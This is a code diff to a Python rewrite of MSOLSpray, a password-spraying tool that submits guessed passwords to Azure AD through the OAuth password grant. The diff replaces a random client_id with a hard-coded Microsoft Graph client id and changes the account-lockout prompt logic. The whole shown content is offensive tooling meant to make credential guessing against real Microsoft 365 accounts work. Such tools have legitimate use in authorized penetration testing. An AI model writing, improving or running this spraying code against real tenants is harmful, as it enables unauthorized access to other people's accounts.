@@ -5,7 +5,6 @@ import time
 from math import trunc
 from random import randrange, shuffle
 from fake_useragent import UserAgent
-from uuid import uuid4
 
 description = """
 This is a pure Python rewrite of dafthack's MSOLSpray (https://github.com/dafthack/MSOLSpray/) which is written in PowerShell. All credit goes to him!
@@ -297,9 +296,8 @@ for pindex, password in enumerate(passwords):
 
         body = {
             "resource": "https://graph.windows.net",
-            "client_id": str(
-                uuid4()
-            ),  # random uuid like '881cea63-30f9-4db0-ae1a-7bec94df9368'
+            # (see https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/how-to-retrieve-an-azure-ad-bulk-token-with-powershell/ba-p/2944894)
+            "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",    # MS Graph API client id
             "client_info": "1",
             "grant_type": "password",
             "username": username,
@@ -437,6 +435,7 @@ for pindex, password in enumerate(passwords):
         # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
         if (
             not args.force
+            and lockout_counter > 0
             and lockout_counter >= lockout_max
             and lockout_question == False
         ):
